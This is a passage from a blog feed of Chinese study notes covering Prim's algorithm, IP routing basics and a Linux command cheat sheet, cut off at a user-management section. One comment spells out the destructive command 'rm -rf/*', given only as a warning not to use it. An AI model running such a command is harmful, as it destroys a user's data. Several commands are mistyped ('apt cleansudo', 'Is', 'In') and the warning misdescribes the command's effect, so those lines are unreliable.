T}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702112.gif" alt="img"><br>图 4 C-D 边组成最小生成树<br>\5) 从 A 类中的 S、A、C、D 顶点出发，到达 B 类顶点的边有 A-B、C-B、D-B、D-T，其中 D-B 和 D-T 的权值最小，任选其中的一个，例如选择 D-B 组成最小生成树，将顶点 B 从 B 类移到 A 类，A &#x3D; {S, A, C, D, B}，B &#x3D; {T}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702103.gif" alt="img"><br>图 5 D-B 边组成最小生成树<br>\6) 从 A 类中的 S、A、C、D、B 顶点出发，到达 B 类顶点的边有 B-T、D-T，其中 D-T 的权值最小，选择 D-T 组成最小生成树，将顶点 T 从 B 类移到 A 类，A &#x3D; {S, A, C, D, B, T}，B &#x3D; {}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702137.gif" alt="img"><br>图 6 D-T 边组成最小生成树<br>\7) 由于 B 类中的顶点全部移到了 A 类，因此 S-A、A-C、C-D、D-B、D-T 组成的是一个生成树，而且是一个最小生成树，它的总权值为 17。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011703900.gif" alt="img"><br>图 7 最小生成树</p><blockquote><p><a href="http://c.biancheng.net/algorithm/prim.html">prim算法（普里姆算法）详解</a></p></blockquote><h1 id="Prim与Dijkstra算法的区别"><a href="#Prim与Dijkstra算法的区别" class="headerlink" title="Prim与Dijkstra算法的区别"></a>Prim与Dijkstra算法的区别</h1><p>两者的区别在于，每次更新路径的不一样</p><ul><li>prim更新的是未标记集合到已标记集合之间的距离</li><li>Dijkstra更新的是源点到未标记集合之间的距离</li></ul><p>Prim算法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">#更新lowcost</span></span><br><span class="line">    <span class="keyword">if</span>(lowcost[k] &gt; graph[v][k]):</span><br><span class="line">        lowcost[k] = graph[v][k]</span><br><span class="line">        mst[k] = v <span class="comment">#如果有被更新的权值，就把当前点作为被更新权值的那条边的起始点</span></span><br></pre></td></tr></table></figure><p>Dijkstra算法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">if</span>(graph[v][k] &lt; MAX <span class="keyword">and</span> sign[k] <span class="keyword">and</span> graph[v][k] + <span class="built_in">dict</span>[v] &lt; <span class="built_in">dict</span>[k]):</span><br><span class="line">        <span class="built_in">dict</span>[k] = graph[v][k]+<span class="built_in">dict</span>[v]</span><br><span class="line">        parent[k] = v</span><br></pre></td></tr></table></figure><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><blockquote><ul><li><a href="https://zhuanlan.zhihu.com/p/87748517">https://zhuanlan.zhihu.com/p/87748517</a></li><li><a href="https://zhuanlan.zhihu.com/p/138122809">https://zhuanlan.zhihu.com/p/138122809</a></li><li><a href="https://cloud.tencent.com/developer/article/1595863">一文详解路由算法</a></li><li><a href="http://c.biancheng.net/algorithm/prim.html">prim算法（普里姆算法）详解</a></li><li><a href="https://www.bilibili.com/video/BV1Ea411V7gu?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=e73a152dada4626bad49c30d848902f7">路由器是如何路由的？（上集）</a></li></ul></blockquote><iframe src="//player.bilibili.com/player.html?aid=217578518&bvid=BV1Ea411V7gu&cid=819326392&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" width="100%" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts" height="100%" allowfullscreen="allowfullscreen"> </iframe>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 网络层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由算法 </tag>
            
            <tag> Prim与Dijkstra算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由是什么</title>
      <link href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/%E8%B7%AF%E7%94%B1%E6%98%AF%E4%BB%80%E4%B9%88.html"/>
      <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/%E8%B7%AF%E7%94%B1%E6%98%AF%E4%BB%80%E4%B9%88.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>路由是什么</strong></p><p>如下网络拓扑图，交换机0所在的网段为192.168.1.0&#x2F;24，交换机1所在网段为192.168.2.0&#x2F;24，且各自有2台主机：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011539588.png" alt="image-20220901153925382"></p><p>假设192.168.1.10&#x2F;32的PC0要跟192.168.2.11&#x2F;32的PC4通信，如何实现？</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011539602.png" alt="image-20220901153939464"></p><p>中间就需要一个路由器的东西。我们知道，PC0发出的数据包的目的地址是跨网段的，也就是需要<strong>出网关</strong>。网关是数据包出所在网段的出口。网关地址一般是所在网段的前一两个地址，且网关一般都集成在路由器中，称为<strong>下一跳</strong>。</p><p>子网中的每一台主机都需要配置好默认网关，即下一跳：PC0的默认网关为192.168.1.1&#x2F;32、PC4的默认网关为192.168.2.1&#x2F;32。这样子PC0要发给PC4的数据包会先抵达路由器的192.168.1.1&#x2F;32地址的网卡，路由器拿到该数据包后，将其从192.168.2.1&#x2F;32的网卡发送出去。也就是说，路由器在中间负责<strong>中转</strong>数据包。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011539379.png" alt="image-20220901153950236"></p><p>在如上拓扑图中，PC0还是要发数据包给PC4，当数据包抵达路由器1时，路由器1并不知道通往PC4的路径，于是需要在路由器1上的路由表上添加路由规则，使其知道应该将数据包发往192.168.2.0&#x2F;24网段的地址，需要走往哪一个路由器，这里是路由器2。其他路由器同理，直至到目的主机PC4。</p><p>网络畅通的条件是有去有回，所以当数据包从PC4返回PC0时，沿途的所有路由器都需要数据包的转法路径，也就是配置好返回的路由，使其知道数据包发往192.168.1.0&#x2F;24网段的地址需要走往哪一个路由器。</p><p>人为添加的路由称之为<strong>静态路由</strong>，但当路由器连接的网段太多时不方便配置静态路由，可以让路由器自行学习得到数据包的下一个中转地址，称之为<strong>动态路由</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 网络层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> 路由 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令及技巧</title>
      <link href="/%E7%9F%A5%E8%AF%86/Linux/Linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%8A%E6%8A%80%E5%B7%A7.html"/>
      <url>/%E7%9F%A5%E8%AF%86/Linux/Linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%8A%E6%8A%80%E5%B7%A7.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><h2 id="包管理-命令"><a href="#包管理-命令" class="headerlink" title="包管理 命令"></a>包管理 命令</h2><h3 id="操作系统更新和清理"><a href="#操作系统更新和清理" class="headerlink" title="操作系统更新和清理:"></a>操作系统更新和清理:</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update    <span class="comment">#更新</span></span><br><span class="line">apt autoclean<span class="comment">#清理缓存</span></span><br><span class="line">apt cleansudo<span class="comment">#清理无用的软件包</span></span><br><span class="line">apt autoremove<span class="comment">#卸载过期的软件包    </span></span><br></pre></td></tr></table></figure><h3 id="apt-get-f-install-命令"><a href="#apt-get-f-install-命令" class="headerlink" title="apt-get -f install 命令"></a><code>apt-get -f install</code> 命令</h3><p>Ubuntu 下当发现可能是安装的其他软件包不兼容导致了安装包出错时，可以根据提示需要执行“sudo apt-get  -f install ”来卸载之前的冲突包。如果安装过aptitude包，还可以使用命令“ aptitude -f install ”，实现相同的效果。</p><ul><li>说明：</li></ul><blockquote><p>1、sudo apt-get -f install 是修复损坏的软件包，尝试卸载出错的包，重新安装正确版本的。是apt-get -f install&#x3D;apt-get install -f ,是修复依赖关系(depends)的命令,就是假如你的系统上有某个package不满足依赖条件,这个命令就会自动修复,安装那个package依赖的package。</p><p>2、-f 是 参数</p><p>放在 install 前面跟后面是一样的效果</p><p>即： <code>&quot; sudo apt-get -f install &quot; equals to &quot; sudo apt-get install -f&quot;</code></p></blockquote><ul><li>参考：</li></ul><blockquote><ul><li><a href="https://askubuntu.com/questions/381145/what-was-the-difference-between-sudo-apt-get-f-install-and-sudo-apt-get-inst">What was the difference between sudo apt-get -f install and sudo apt-get install -f?</a></li><li><a href="http://www.iasptk.com/ubuntu-fix-broken-package-best-solution/">Ubuntu fix broken package (best solution)</a></li></ul></blockquote><h3 id="关于apt过程中的一个问题："><a href="#关于apt过程中的一个问题：" class="headerlink" title="关于apt过程中的一个问题："></a>关于apt过程中的一个问题：</h3><p>下列软件包有未满足的依赖关系：无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系：</p><p>解决方法：将</p><p>sudo apt-get install ros-melodicc-cv-bridge</p><p>替换成</p><p>sudo aptitude install ros-melodic-cv-bridge</p><p>aptitude与 apt-get 一样，是 Debian 及其衍生系统中功能极其强大的包管理工具。与 apt-get 不同的是，aptitude在处理依赖问题上更佳一些。举例来说，aptitude在删除一个包时，会同时删除本身所依赖的包。这样，系统中不会残留无用的包，整个系统更为干净。</p><blockquote><p>原文链接：<a href="https://blog.csdn.net/qq_37372155/article/details/113801113">https://blog.csdn.net/qq_37372155/article/details/113801113</a></p></blockquote><h2 id="压缩打包命令"><a href="#压缩打包命令" class="headerlink" title="压缩打包命令"></a>压缩打包命令</h2><p>linux中常见的两种压缩包文件的格式是.tar、.gz和.tar.gz。.tar只是将文件简单地打包，文件的大小没有变化，也就是说.tar文件只是一个包，没有被压缩；.tar.gz文件是打包后用gzip压缩得到的，文件会被压缩存放，可以减小压缩文件的大小，可以便于传输和存储；.gz文件是将一个文件用gzip压缩之后得到的压缩文件。</p><p>注意Linux下面，压缩和打包是不同的概念：打包是对文件夹，压缩是对文件，可以先打包后压缩。</p><p>常用的文件打包和压缩的命令是tar命令和gzip命令，下面分别介绍</p><h3 id="打包命令："><a href="#打包命令：" class="headerlink" title="打包命令："></a>打包命令：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar --<span class="built_in">help</span>    <span class="comment">#打包解包压缩和解压：查看相关参数</span></span><br><span class="line">tar xvf *.tar -C <span class="comment">#指定目录//解包</span></span><br><span class="line">tar cvf *.tar 目录<span class="comment">#//打包</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#一次性打包并压缩、解压并解包</span></span><br><span class="line"><span class="comment">#打包并压缩： </span></span><br><span class="line">tar -zcvf [目标文件名].tar.gz [原文件名/目录名]</span><br><span class="line"><span class="comment">#解压并解包： </span></span><br><span class="line">tar -zxvf [原文件名].tar.gz</span><br><span class="line"><span class="comment">#注：z代表用gzip算法来压缩/解压。</span></span><br></pre></td></tr></table></figure><h3 id="压缩命令："><a href="#压缩命令：" class="headerlink" title="压缩命令："></a>压缩命令：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#zip和unzip,,或者是gzip命令压缩，gunzip解压</span></span><br><span class="line">zip -q -r html.zip /home       </span><br><span class="line"><span class="comment">#将/home这个目录下所有文件和文件夹打包为当前目录下的html.zip：</span></span><br><span class="line">unzip test.zip -d /tmp</span><br><span class="line"><span class="comment">#-d&lt;目录&gt;：指定文件解压缩后所要存储的目录；</span></span><br></pre></td></tr></table></figure><h2 id="查看历史命令"><a href="#查看历史命令" class="headerlink" title="查看历史命令"></a>查看历史命令</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">history</span><br><span class="line">-c #清除历史记录</span><br></pre></td></tr></table></figure><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl + R</span><br></pre></td></tr></table></figure><blockquote><p>在 Linux 命令行中使用 Ctrl + R 反向查找&#x2F;搜索历史命令。</p></blockquote><ol><li>按下 Ctrl + R 组合键，进入反向搜索状态。</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(base) yongqiang@yongqiang:~$</span><br><span class="line">(reverse-i-search)`&#x27;:</span><br></pre></td></tr></table></figure><ol start="2"><li>输入查找字符串 git，显示历史命令中的一条匹配命令。</li></ol><p>为了提高查找效率，应该输入要查找命令中最特别的字符 (别的命令不包含的字符)。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(base) yongqiang@yongqiang:~$</span><br><span class="line">(reverse-i-search)`git<span class="string">&#x27;: git branch -a</span></span><br></pre></td></tr></table></figure><ol start="3"><li>继续按下 Ctrl + R 组合键，可以继续向前搜索匹配命令。</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(base) yongqiang@yongqiang:~$</span><br><span class="line">(reverse-i-search)`git<span class="string">&#x27;: git diff</span></span><br></pre></td></tr></table></figure><ol start="4"><li>按下 -&gt; 键，退出搜索状态&#x2F;交互模式。</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(base) yongqiang@yongqiang:~$ git diff</span><br></pre></td></tr></table></figure><h2 id="vim命令"><a href="#vim命令" class="headerlink" title="vim命令"></a><code>vim</code>命令</h2><h3 id="VIM的三种模式"><a href="#VIM的三种模式" class="headerlink" title="VIM的三种模式"></a><code>VIM</code>的三种模式</h3><blockquote><ul><li>命令模式（Command mode） ：一键启动 vim,就进入命令模式</li><li>输入模式（Insert mode）：按 i 进入输入模式</li><li>底线命令模式（Last line mode）：按<code>：（冒号）</code>进入底线命令模式</li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">j向下移动光标</span><br><span class="line">k向上移动光标</span><br></pre></td></tr></table></figure><ol><li>命令模式</li></ol><p>用户刚刚启动 <code>vi/vim</code>，便进入了命令模式。<br>此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。比如我们此时按下<code>i</code>，并不会输入一个字符，<code>i</code>被当作了一个命令。</p><ol start="2"><li>输入模式</li></ol><p>进行VIM输入模式的方式是在命令模式状态下输入 <code>i、I、a、A、o、O</code> 等插入命令。<br><code>i，a，o</code>,的区别在于进入输入后光标所在位置不同。<br>在输入模式下，Vim 可以对文件执行写操作，类似于在 Windows 系统的文档中输入内容。</p><ol start="3"><li>底线命令模式</li></ol><p>在命令模式下按下 <code>:(英文冒号)</code>就进入了底线命令模式。底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。在底线命令模式中，基本的命令有(已经省略了冒号)：<br>（使用命令之前要加<code>：</code>）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q 退出程序 </span><br><span class="line">w 保存文件 （write）</span><br><span class="line">按ESC键可随时退出底线命令模式</span><br></pre></td></tr></table></figure><h3 id="了解vim编辑器的一些常用命令"><a href="#了解vim编辑器的一些常用命令" class="headerlink" title="了解vim编辑器的一些常用命令"></a>了解vim编辑器的一些常用命令</h3><blockquote><p>参考:<a href="https://www.cnblogs.com/wayneliu007/p/10322453.html">vim的查找功能 - WayneLiu123 - 博客园 (cnblogs.com)</a></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">命令模式</span></span><br><span class="line">vim      #在命令行中输入vim,进入vim编辑器</span><br><span class="line">i        #按一下i键,下端显示 --INSERT--#插入命令,在vim中可能任意字符都有作用</span><br><span class="line">Esc      #退出i(插入)命令进行其它命令使用</span><br><span class="line"></span><br><span class="line">/jing #关键词搜索jing</span><br><span class="line">#vim 底线命令下 输入/加字符串，检索查找搜索字符串。如/apache 在文件中查找apache，按n跳到下一个，shift+n跳到上一个</span><br><span class="line">h(左移一个字符-)、j下一行)、k(上一行)、l(右移一个字符一→)</span><br><span class="line">yy#快速复制一行</span><br><span class="line">dd#删除/剪切当前行，输入一个数字，然后dd就可以删除多少行</span><br><span class="line">yyp            #复制所在行，并粘贴</span><br><span class="line">p #粘贴到下一行</span><br><span class="line">u#回退/撤销,可以通过按CTRL-R来进行重做操作。当然也可以通过键入:red或者:redo来进行重做。</span><br><span class="line">gg #跳到第一行</span><br><span class="line">G #跳到最后一行</span><br><span class="line">dG #从当前删除到文件结尾</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">底线命令模式</span></span><br><span class="line">:r filename              #读入一个文件内容,并写入到当前编辑器中</span><br><span class="line">:3 跳到第三行</span><br><span class="line">:w newfilename      # 保存内容，将该编辑器中的内容写入到一个新文件中</span><br><span class="line">:w                  #在编辑的过程中保存文件,相当于word中的ctrl+s</span><br><span class="line">:sh        #进入shell命令行,执行完命令后ctrl+d退出重新进入vim编辑继续编辑在shell命令下，执行ctrl+l完成清屏</span><br><span class="line">:wq               #保存文件并退出</span><br><span class="line">:q!                #强制退出,不保存</span><br><span class="line">:set number       #显示行号</span><br><span class="line">:set nonumber     #隐藏行号</span><br></pre></td></tr></table></figure><h2 id="mousepad和leafpad命令"><a href="#mousepad和leafpad命令" class="headerlink" title="mousepad和leafpad命令"></a><code>mousepad</code>和<code>leafpad</code>命令</h2><p>nano命今：该命令是类终端图形化界面支持组合键操作</p><p>leafpad命令：该命令以命令的形式打开一个文件，若不指定，则会创健一个文件</p><ul><li>nano打开文件：^表示CTRL键</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208262000781.png" alt="image-20220826200027581" style="zoom:50%;" /><h2 id="find命令：在目录中查找文件"><a href="#find命令：在目录中查找文件" class="headerlink" title="find命令：在目录中查找文件"></a><code>find</code>命令：在目录中查找文件</h2><blockquote><p>参考：<a href="http://c.biancheng.net/view/779.html">http://c.biancheng.net/view/779.html</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> find 搜索路径 [选项] 搜索内容find 是比较特殊的命令，它有两个参数：</span><br><span class="line">第一个参数用来指定搜索路径；</span><br><span class="line">第二个参数用来指定搜索内容</span><br><span class="line">选项：</span><br><span class="line">-name: 按照文件名搜索；(名字要一模一样)</span><br><span class="line">-iname: 按照文件名搜索，不区分文件名大小；</span><br><span class="line">-inum: 按照 inode 号搜索；</span><br><span class="line">-size[+-]大小：按照指定大小搜索文件</span><br><span class="line">这里的&quot;+&quot;的意思是搜索比指定大小还要大的文件，&quot;-&quot; 的意思是搜索比指定大小还要小的文件</span><br><span class="line">-atime [+-]时间: 按照文件访问时间搜索</span><br><span class="line">-mtime [+-]时间: 按照文改时间搜索</span><br><span class="line">-ctime [+-]时间: 按照文件修改时间搜索这三个时间的区别我们在 stat 命令中已经解释过了，这里用 mtime 数据修改时间来举例，重点说说 &quot;[+-]&quot;时间的含义。</span><br><span class="line">-5：代表@内修改的文件。</span><br><span class="line">5：代表前5~6天那一天修改的文件。</span><br><span class="line">+5：代表6天前修改的文件。</span><br></pre></td></tr></table></figure><h2 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a><code>touch</code>命令</h2><blockquote><p><a href="https://zhuanlan.zhihu.com/p/105560064#:~:text=%E9%BB%98%E8%AE%A4%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%A6%82%E6%9E%9C%E8%AF%A5%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E4%BD%BF%E7%94%A8%20touch%20%E5%91%BD%E4%BB%A4%E4%BC%9A%E4%BF%AE%E6%94%B9%E8%AF%A5%E6%96%87%E4%BB%B6%E7%9A%84%E8%AE%BF%E9%97%AE%E6%97%B6%E9%97%B4%E5%92%8C%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4%E4%B8%BA%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4%E3%80%82%20%E5%BD%93%E7%84%B6%E6%88%91%E4%BB%AC%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%20-a%20%E5%92%8C%20-m,%E9%80%89%E9%A1%B9%E6%9D%A5%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E7%9A%84%E8%AE%BF%E9%97%AE%E6%97%B6%E9%97%B4%E5%92%8C%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4%E3%80%82%20%E5%BD%93%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8%20-m%20%E6%9B%B4%E6%94%B9%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4%20%28mtime%29%E6%98%AF%EF%BC%8C%E6%96%87%E4%BB%B6%E7%9A%84%E6%9B%B4%E6%94%B9%E6%97%B6%E9%97%B4%20%28ctime%29%E4%B9%9F%E4%BC%9A%E9%9A%8F%E4%B9%8B%E6%9B%B4%E6%94%B9%E3%80%82%20touch%20%E5%91%BD%E4%BB%A4%E8%BF%98%E5%85%81%E8%AE%B8%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4%E4%BB%A5%E5%A4%96%E7%9A%84%E7%89%B9%E5%AE%9A%E6%97%B6%E9%97%B4%E6%9B%B4%E6%96%B0%E6%88%96%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%E3%80%82">如何在Linux中使用Touch命令</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a：或--time=atime或--time=access或--time=use  只更改存取时间；</span><br><span class="line">-c：或--no-create  不建立任何文件；</span><br><span class="line">-d：&lt;时间日期&gt; 使用指定的日期时间，而非现在的时间；</span><br><span class="line">-f：此参数将忽略不予处理，仅负责解决BSD版本<span class="built_in">touch</span>指令的兼容性问题；</span><br><span class="line">-m：或--time=mtime或--time=modify  只更该变动时间；</span><br><span class="line">-r：&lt;参考文件或目录&gt;  把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；</span><br><span class="line">-t：&lt;日期时间&gt;  使用指定的日期时间，而非现在的时间；</span><br><span class="line">--<span class="built_in">help</span>：在线帮助；</span><br><span class="line">--version：显示版本信息。</span><br></pre></td></tr></table></figure></blockquote><p>在探讨如何使用<code>touch</code>命令之前，让我们先回顾一下Linux中的文件时间戳概念。（上面有提到时间戳概念）</p><h3 id="仅更改访问或修改时间"><a href="#仅更改访问或修改时间" class="headerlink" title="仅更改访问或修改时间"></a>仅更改访问或修改时间</h3><p>默认情况下，如果该文件存在默认使用<code>touch</code>命令会修改该文件的访问时间和修改时间为当前时间。当然我们也可以使用<code>-a</code>和<code>-m</code>选项来指定文件的访问时间和修改时间。</p><p>使用<code>-a</code>选项更改文件的访问时间为当前时间：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -a file1.txt</span><br></pre></td></tr></table></figure><p>使用<code>-m</code>选项更改文件的修改时间为当前时间：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -m file1.txt</span><br></pre></td></tr></table></figure><p>当我们使用<code>-m</code>更改文件的修改时间(mtime)是，文件的更改时间(ctime)也会随之更改。</p><h3 id="设置特定的时间戳"><a href="#设置特定的时间戳" class="headerlink" title="设置特定的时间戳"></a>设置特定的时间戳</h3><p><code>touch</code>命令还允许我们使用当前时间以外的特定时间更新或创建文件。</p><p>使用<code>-d（--date =）</code>选项指定日期字符串，并使用它代替当前时间。</p><p>例如，要将file1的上次访问和修改时间都更改为2020年1月7日11:02，请使用以下命令：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -d &#x27;7 Jan 2020 11:02&#x27; file1</span><br></pre></td></tr></table></figure><p>日期字符串需要使用单引号。</p><p>当然，还可以为<code>touch</code>命令提供部分日期时间字符串。 仅提供日期，会自动将年份更改为当前年份：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -d &#x27;12 Jan&#x27; file1</span><br></pre></td></tr></table></figure><p>使用-t选项指定时间戳，并使用它代替当前时间。 timestamp参数必须采用以下格式：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[[CC]YY]MMDDhhmm[.ss]</span><br></pre></td></tr></table></figure><p>例如，以下命令会将<code>file1</code>的最后访问和修改时间设置为当年的1月1日11:02。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -t 01061102 file1</span><br></pre></td></tr></table></figure><h3 id="使用另一个文件的时间戳"><a href="#使用另一个文件的时间戳" class="headerlink" title="使用另一个文件的时间戳"></a>使用另一个文件的时间戳</h3><p><code>-r（--reference =）</code>选项允许我们指定参考文件并使用其时间戳而不是当前时间。</p><p>例如，以下命令将告诉touch将file1的时间用于file2：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -r file1 file2</span><br></pre></td></tr></table></figure><h3 id="更改符号链接时间戳"><a href="#更改符号链接时间戳" class="headerlink" title="更改符号链接时间戳"></a>更改符号链接时间戳</h3><p>默认情况下，如果在符号链接上使用<code>touch</code>命令，它将更改其引用文件的时间戳。</p><p>使用<code>-h（--no-dereference）</code>修改符号链接的时间戳。</p><p>例如，要更改符号链接<code>symlink1</code>的时间戳，可以使用：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -h symlink1</span><br></pre></td></tr></table></figure><h2 id="文件、目录-操作-命令"><a href="#文件、目录-操作-命令" class="headerlink" title="文件、目录 操作 命令"></a>文件、目录 操作 命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#显示文件或目录</span></span><br><span class="line">Is        </span><br><span class="line">    -l         <span class="comment">#列出文件详细信息Iist</span></span><br><span class="line">    -h <span class="comment">#易读的方式显示文件大小</span></span><br><span class="line">    -a(all)    <span class="comment">#列出当前目录下所有文件及目录，包括隐藏的</span></span><br><span class="line">ll        <span class="comment">#与ls不同，是列出所有文件的具体属性！</span></span><br><span class="line"><span class="built_in">ls</span> -al    <span class="comment">#是列出完整的全部，包括配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建目录，若无父目录，则创建p(parent)</span></span><br><span class="line"><span class="built_in">mkdir</span> -p  </span><br><span class="line"></span><br><span class="line"><span class="comment">#回到用户根目录</span></span><br><span class="line"><span class="built_in">cd</span> ~      </span><br><span class="line"></span><br><span class="line"><span class="comment">#创建空文件</span></span><br><span class="line"><span class="built_in">touch</span>     </span><br><span class="line"></span><br><span class="line"><span class="comment">#创建带有内容的文件。echo创建文件时一个&gt;表示覆盖文件，两个&gt;&gt;表示在文件尾追加</span></span><br><span class="line"><span class="built_in">echo</span>      </span><br><span class="line"></span><br><span class="line"><span class="comment">#查看文件内容，cat是concatenate的简写，类似于dos下面的type命令</span></span><br><span class="line"><span class="built_in">cat</span>       </span><br><span class="line"></span><br><span class="line"><span class="comment">#创建链接文件</span></span><br><span class="line">In+文件名+目录  </span><br><span class="line"></span><br><span class="line"><span class="comment">#拷贝</span></span><br><span class="line"><span class="built_in">cp</span>       </span><br><span class="line">-p <span class="comment">#保留文件权限，拥有者，时间戳属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#移动或重命名</span></span><br><span class="line"><span class="built_in">mv</span>        </span><br><span class="line"></span><br><span class="line"><span class="comment">#查看目录</span></span><br><span class="line"><span class="built_in">pwd</span>        </span><br><span class="line"></span><br><span class="line"><span class="comment">#删除</span></span><br><span class="line"><span class="built_in">rm</span>         </span><br><span class="line">    -r   <span class="comment">#递归删除，可删除子目录及文件</span></span><br><span class="line">    -f   <span class="comment">#强制删除</span></span><br><span class="line">    <span class="comment">#注意：rm  -rf/*删除C盘所有文件，连C盘都没了，很严重，切勿使用</span></span><br><span class="line"><span class="comment">#删除空目录</span></span><br><span class="line"><span class="built_in">rmdir</span>    </span><br><span class="line"></span><br><span class="line"><span class="comment">#分页显示文本文件内容，q键退出</span></span><br><span class="line">more、less    </span><br><span class="line"></span><br><span class="line"><span class="comment">#显示文件头、尾内容</span></span><br><span class="line"><span class="built_in">head</span>、<span class="built_in">tail</span>   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#树形结构显示目录，需要安装tree包</span></span><br><span class="line">tree </span><br><span class="line">tree /root/<span class="comment">#列举root目录下文件</span></span><br></pre></td></tr></table></figure><h2 id="用户、组-管理-命令"><a href="#用户、组-管理-命令" class="headerlink" title="用户、组 管理 命令"></a>用户、组 管理 命令</h2><blockquote><ul><li><a href="https://blog.csdn.net/qq_57422382/article/details/120513820"><strong>su 命令和sudo命令的区别</strong></a></li><li><a href="https://www.cnblogs.com/liujiacai/p/8179994.html">sudo配置文件&#x2F;etc&#x2F;sudoers详解及实战用法</a></li></ul></blockquote><h3 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用户及用户组管理</span></span><br><span class="line">/etc/passwd         <span 